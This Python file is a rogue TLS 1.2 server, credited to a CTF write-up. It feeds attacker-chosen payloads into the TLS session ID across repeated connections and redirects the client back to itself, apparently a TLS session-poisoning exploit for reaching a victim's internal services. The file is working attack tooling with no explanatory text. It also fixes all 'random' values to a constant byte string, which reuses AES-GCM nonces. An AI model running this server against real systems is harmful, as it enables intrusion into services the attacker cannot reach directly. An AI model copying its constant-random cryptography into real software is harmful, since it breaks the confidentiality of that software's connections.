# Blatantly copied from https://github.com/dfyz/ctf-writeups/blob/master/hxp-2020/security%20scanner/fake_git.py
import argparse
import base64
import hashlib
import hmac
import re
import socket
import struct
import time
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from dataclasses import dataclass
from pathlib import Path
import threading


# RFC 5246, section 5
def prf(secret, label, seed, length):
    def hmac_sha256(key, msg):
        return hmac.digest(key, msg, hashlib.sha256)

    seed = label + seed

    result = b''
    cur_a = seed
    while len(result) < length:
        cur_a = hmac_sha256(secret, cur_a)
        result += hmac_sha256(secret, cur_a + seed)
    return result[:length]


def to_ad(seq_num, tls_type, tls_version, tls_len):
    return struct.pack('>QBHH', seq_num, tls_type, tls_version, tls_len)

# Chosen by fair dice roll, guaranteed to be random.
def get_random_bytes(length):
    return b'A' * length

class TLS:
    # in bytes (i.e., this is 4096 bits)
    KEY_LENGTH = 512
    PKCS_PREFIX = b'\x00\x02'

    # TLS 1.2
    VERSION = 0x0303
    # TLS_RSA_WITH_AES_128_GCM_SHA256, because we don't care to support the full DH exchange.
    CIPHER_SUITE = 0x9c

    CHANGE_CIPHER_SPEC_CONTENT_TYPE = 0x14
    ALERT_CONTENT_TYPE = 0x15
    HANDSHAKE_CONTENT_TYPE = 0x16
    DATA_CONTENT_TYPE = 0x17

    FINISHED_HANDSHAKE_TYPE = 0x14

    @dataclass
    class Record:
        content_type: int
        version: int
        data: bytes

    @dataclass
    class HandshakeRecord:
        handshake_type: int
        data: bytes

    @dataclass
    class SessionKeys:
        master_secret: bytes
        client_key: bytes
        server_key: bytes
        client_salt: bytes
        server_salt: bytes

    def __init__(self, socket, priv_key, certs, session_id):
        self.socket = socket
        self.priv_key = priv_key
        self.certs = certs
        # Chosen by a fair dice roll.
        self.server_random = get_random_bytes(32)
        self.session_id = session_id

        self.client_seq_num = 0
        self.server_seq_num = 0
        self.handshake_log = b''

        self.session_keys = None
        self._shake_hands()

    def _read_record(self, expected_type):
        header = self.socket.recv(5)
        content_type, version, length = struct.unpack('>BHH', header)
        data = self.socket.recv(length)
        assert content_type == expected_type, f'Bad content type: got {content_type}, expected {expected_type}'
        return TLS.Record(content_type, version, data)

    def _write_record(self, record):
        payload = struct.pack('>BHH', record.content_type, record.version, len(record.data)) + record.data
        self.socket.send(payload)

    def _read_handshake_record(self, expected_type, decrypt=False):
        record = self._read_record(TLS.HANDSHAKE_CONTENT_TYPE)
        payload = record.data
        if decrypt:
            payload = self._decrypt(payload, TLS.HANDSHAKE_CONTENT_TYPE, record.version)
        self.handshake_log += payload
        header_size = 4
        header, *_ = struct.unpack('>I', payload[:header_size])
        handshake_type = header >> 24
        assert handshake_type == expected_type, f'Bad handshake type: got {handshake_type}, expected {expected_type}'
        length = header & 0xFF_FF_FF
        return TLS.HandshakeRecord(handshake_type, payload[header_size:header_size + length])

    def _write_handshake_record(self, record, encrypt=False):
        header = (record.handshake_type << 24) | len(record.data)
        payload = struct.pack('>I', header) + record.data
        if encrypt:
            payload = self._encrypt(payload, TLS.HANDSHAKE_CONTENT_TYPE)
        self.handshake_log += payload
        self._write_record(TLS.Record(TLS.HANDSHAKE_CONTENT_TYPE, TLS.VERSION, payload))

    def _get_server_hello(self):
        return b''.join([
            struct.pack('>H', TLS.VERSION),
            self.server_random,
            struct.pack('B', len(self.session_id)),
            self.session_id,
            # No compression, no extension
            struct.pack('>HBH', TLS.CIPHER_SUITE, 0, 0),
        ])

    def _get_certificate(self):
        def int16_to_int24_bytes(x):
            return b'\x00' + struct.pack('>H', x)

        packed_certs = b''.join([
            int16_to_int24_bytes(len(cert)) + cert
            for cert in self.certs
        ])

        return int16_to_int24_bytes(len(packed_certs)) + packed_certs

    def derive_keys(self, encrypted_premaster_secret, client_random):
        assert len(encrypted_premaster_secret) == TLS.KEY_LENGTH
        encrypted_premaster_secret = int.from_bytes(encrypted_premaster_secret, byteorder='big')
        premaster_secret = pow(encrypted_premaster_secret, self.priv_key.d, self.priv_key.n).to_bytes(TLS.KEY_LENGTH, byteorder='big')

        assert premaster_secret.startswith(TLS.PKCS_PREFIX)
        premaster_secret = premaster_secret[premaster_secret.find(b'\x00', len(TLS.PKCS_PREFIX)) + 1:]
        assert len(premaster_secret) == 48

        master_secret = prf(premaster_secret, b'master secret', client_random + self.server_random, 48)

        enc_key_length, fixed_iv_length = 16, 4
        expanded_key_length = 2 * (enc_key_length + fixed_iv_length)
        key_block = prf(master_secret, b'key expansion', self.server_random + client_random, expanded_key_length)
        return TLS.SessionKeys(
            master_secret=master_secret,
            client_key=key_block[:enc_key_length],
            server_key=key_block[enc_key_length:2 * enc_key_length],
            client_salt=key_block[2 * enc_key_length:2 * enc_key_length + fixed_iv_length],
            server_salt=key_block[2 * enc_key_length + fixed_iv_length:],
        )

    def _get_server_finished(self):
        session_hash = hashlib.sha256(self.handshake_log).digest()
        return prf(self.session_keys.master_secret, b'server finished', session_hash, 12)

    def _encrypt(self, data, tls_type):
        explicit_nonce = get_random_bytes(8)
        cipher = AES.new(self.session_keys.server_key, AES.MODE_GCM, nonce=self.session_keys.server_salt + explicit_nonce)
        cipher.update(to_ad(self.server_seq_num, tls_type, TLS.VERSION, len(data)))
        ciphertext, tag = cipher.encrypt_and_digest(data)
        self.server_seq_num += 1
        return explicit_nonce + ciphertext + tag

    def _decrypt(self, data, tls_type, tls_version):
        cipher = AES.new(self.session_keys.client_key, AES.MODE_GCM, nonce=self.session_keys.client_salt + data[:8])
        ciphertext = data[8:-16]
        tag = data[-16:]
        cipher.update(to_ad(self.client_seq_num, tls_type, tls_version, len(ciphertext)))
        self.client_seq_num += 1
        return cipher.decrypt_and_verify(ciphertext, tag)

    def read(self):
        record = self._read_record(TLS.DATA_CONTENT_TYPE)
        payload = self._decrypt(record.data, TLS.DATA_CONTENT_TYPE, record.version)
        #print(f'Got a message of length {len(payload)}')
        return payload

    def write(self, msg):
        payload = self._encrypt(msg, TLS.DATA_CONTENT_TYPE)
        self._write_record(TLS.Record(TLS.DATA_CONTENT_TYPE, TLS.VERSION, payload))
        #print(f'Sent a message of length {len(payload)}')

    def _shake_hands(self):
        client_hello = self._read_handshake_record(0x1).data
        client_random = client_hello[2:2 + 32]
        #print(f'Got client hello')

        self._write_handshake_record(TLS.HandshakeRecord(0x2, self._get_server_hello()))
        #print(f'Sent server hello with session id {self.session_id}')

        self._write_handshake_record(TLS.HandshakeRecord(0xb, self._get_certificate()))
        #print(f'Sent {len(self.certs)} certificates')

        self._write_handshake_record(TLS.HandshakeRecord(0xe, b''))
        #print(f'Sent server hello done')

        # Skip the redundant premaster secret length.
        encrypted_premaster_secret = self._read_handshake_record(0x10).data[2:]
        #print(f'Got a premaster secret')
        self.session_keys = self.derive_keys(encrypted_premaster_secret, client_random)

        self._read_record(TLS.CHANGE_CIPHER_SPEC_CONTENT_TYPE)
        client_finished = self._read_handshake_record(TLS.FINISHED_HANDSHAKE_TYPE, decrypt=True)
        #print(f'Got client finished')

        self._write_record(TLS.Record(TLS.CHANGE_CIPHER_SPEC_CONTENT_TYPE, TLS.VERSION, b'\x01'))
        server_finished = TLS.HandshakeRecord(TLS.FINISHED_HANDSHAKE_TYPE, self._get_server_finished())
        self._write_handshake_record(server_finished, encrypt=True)
        #print(f'Sent server finished, the connection is ready')


def get_http_response(code, headers, content):
    headers.update({
        'Connection': 'close',
        'Content-Length': str(len(content)),
    })

    return '\r\n'.join([
        f'HTTP/1.1 {code} Whatever',
        '\r\n'.join([
            f'{k}: {v}' for k, v in headers.items()
        ]),
        '',
        content,
    ]).encode()

def run_rogue_server(key, cert, port, delay, location, payloads):
    payloads += [b'LAST_CHECK_DUMMY']
    def run():
        priv_key = RSA.import_key((Path(__file__).parent / Path(key)).read_text())
        certs = [
            base64.b64decode(''.join(
                cert_line
                for cert_line in cert.splitlines()
                if not cert_line.startswith('-')
            ))
            for cert in (Path(__file__).parent / Path(cert)).read_text().split('\n\n')
        ]

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', port))
        server_socket.listen(5)

        print('Server started.')

        success_printed = [False]*len(payloads)
        pi = 0
        while pi < len(payloads):
            client_socket, address = server_socket.accept()
            print(f'Got a connection from {address}!')

            print(f'Trying #{pi}')
            session_id = payloads[pi].ljust(32, b'\0')
            try:
                # Sometimes throw AssertionError due to ALERT_CONTENT_TYPE at self-redirect
                tls = TLS(client_socket, priv_key, certs, session_id)
                http_request = tls.read()
                assert b'fdzz' not in http_request
            except:
                # This indicates that the previous payload redirected to the current payload.
                # Thus, we must retry previous payload.
                print(f'Retry #{pi - 1}...')
                pi -= 1
                client_socket.close()
                continue

            if pi > 0 and not success_printed[pi - 1]:
                print(f'Checked #{pi - 1} success. (payload {payloads[pi - 1]})')
                success_printed[pi - 1] = True
            pi += 1

            time.sleep(delay)

            headers = {
                'Location': location + '?fdzz',
            }
            tls.write(get_http_response(302, headers, ''))

            client_socket.close()
    
    t = threading.Thread(target=run, daemon=True)
    t.start()
    return t
